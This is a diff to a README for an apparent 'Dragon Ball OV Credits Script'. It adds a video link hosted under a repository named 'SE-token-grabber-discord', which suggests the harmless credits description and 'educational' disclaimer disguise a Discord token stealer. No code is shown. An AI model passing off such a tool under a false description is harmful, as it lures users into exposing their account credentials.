@@ -5,6 +5,12 @@ This tool has been developed strictly for educational purposes, with the primary
 
 The creators of this tool do not endorse or condone any form of unauthorized access, intrusion, or exploitation of computer systems, networks, or data. Any misuse of this tool for illegal activities is strictly prohibited, and the developers bear no responsibility for such actions.
 
+
+
+https://github.com/ch13fu/SE-token-grabber-discord/assets/153553558/b15d73f9-09af-4f89-ab78-5078dc896bd3
+
+
+
 ## Overview
 
 Welcome to the Dragon Ball OV Credits Script! This Python script adds credits to a user's account and sends a notification email. The script also prints the Dragon Ball title in large text using the pyfiglet library.
